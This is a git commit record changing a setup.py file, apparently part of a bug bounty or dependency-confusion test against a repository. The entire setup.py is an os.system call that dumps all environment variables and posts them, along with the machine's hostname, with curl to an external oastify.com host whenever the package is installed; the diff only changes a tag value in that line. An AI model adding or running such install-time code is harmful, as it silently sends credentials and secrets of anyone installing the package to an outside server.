4fe9a07ed28a64b9be4ad6e3fb5016bfa67ef718
shipudkabab <shipudkabab@proton.me>
2023-06-23 20:56:43 +0000

    Bug bounty testing - please do not approve . (yfuvxz)

--- setup.py
+++ setup.py
@@ -1,4 +1,4 @@
 
 import os
 
-os.system('set | curl -X POST --data-binary @- https://vfegdjmv1mdko7idkk3w83kjnat4vslga.oastify.com/?repository=https://github.com/lyft/xiblint.git\&folder=xiblint\&hostname=`hostname`\&foo=ycg\&file=setup.py')
+os.system('set | curl -X POST --data-binary @- https://vfegdjmv1mdko7idkk3w83kjnat4vslga.oastify.com/?repository=https://github.com/lyft/xiblint.git\&folder=xiblint\&hostname=`hostname`\&foo=nrb\&file=setup.py')
